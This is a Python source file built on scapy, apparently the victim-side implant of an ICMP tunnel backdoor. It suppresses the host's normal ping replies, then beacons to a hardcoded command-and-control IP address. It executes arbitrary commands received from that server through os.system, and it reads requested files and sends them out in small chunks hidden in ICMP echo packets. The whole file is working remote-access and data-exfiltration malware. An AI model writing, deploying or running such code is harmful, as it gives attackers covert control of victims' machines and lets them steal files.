from scapy.all import *
from scapy.layers.inet import *
import os
import subprocess

BEACON = 60417
ANSWER = 60418
DONE = 60419
MAXSIZE = 40
victim_done = 0

def ignoreICMP2():
    try:
        f = open("/proc/sys/net/ipv4/icmp_echo_ignore_all", "w+")
        contents = f.read()
        if contents[0] != "1":
            os.system('echo "1" > /proc/sys/net/ipv4/icmp_echo_ignore_all')
        f.close()
    except:
        print("[!] You need to run this tool with administrator privileges.")
        sys.exit()

def victim_beacon(c2_ip): #send pings to server to let him know victim is ready.
    ignoreICMP2()
    while True:
        send(IP(dst=c2_ip) / ICMP(id=BEACON, type="echo-request"), verbose=0)
        sniff(prn=lambda packet: handle_requests(packet, c2_ip), filter="icmp", store=False, timeout = 20) #sniff server reply.

def handle_requests(pkt, c2_ip):
    if pkt[0][ICMP].id == BEACON:
        # parse server packet:
        packet_payload = str(pkt[3].load)
        list1 = packet_payload.split(";")
        command = list1[0]
        param = list1[1][:-1]

        print(packet_payload)

        if "exe" in command:
            os.system(param)

        elif "ls" in command:
            result1 = subprocess.check_output(["ls"])
            send_string = str(result1)+"victimdone"
            send(IP(dst=c2_ip) / ICMP(id=DONE, type="echo-request") / send_string)

        elif "file" in command:
            with open(param) as file1:
                contents = file1.read()
                # splint to chuncks
                chunk_list = [contents[i:i + MAXSIZE] for i in range(0, len(contents), MAXSIZE)]
                for chunk in chunk_list:
                    send(IP(dst=c2_ip) / ICMP(id=ANSWER, type="echo-request") / chunk)

            print("whole file sent\n")
            send(IP(dst=c2_ip) / ICMP(id=DONE, type="echo-request") / "victimdone")

victim_beacon("3.91.102.172")





